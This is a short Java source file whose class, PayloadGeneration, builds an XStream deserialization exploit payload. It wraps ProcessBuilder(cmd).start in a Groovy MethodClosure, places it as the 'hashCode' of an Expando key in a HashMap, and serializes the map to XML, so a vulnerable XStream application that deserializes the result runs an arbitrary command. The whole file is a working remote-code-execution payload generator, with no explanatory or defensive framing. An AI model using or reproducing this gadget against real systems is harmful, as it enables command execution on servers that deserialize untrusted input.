package payload;

import groovy.util.Expando;

import java.util.HashMap;
import java.util.Map;

import org.codehaus.groovy.runtime.MethodClosure;

import com.thoughtworks.xstream.XStream;


public class PayloadGeneration {
	
	public static String generateExecPayload(String cmd) throws Exception
	{
		
		Map map = new HashMap<Expando, Integer>();
		Expando expando = new Expando();
		
		MethodClosure methodClosure = new MethodClosure(new java.lang.ProcessBuilder(cmd), "start");
		//methodClosure.setDelegate(expando);
		
		expando.setProperty("generation_hashCode", methodClosure);
		map.put(expando, 123);
		
		//Serialize the object
		XStream xs = new XStream();
		 
		String payload =  xs.toXML(map).replace("generation_hashCode", "hashCode");
		
		return payload;  
		
	}

}
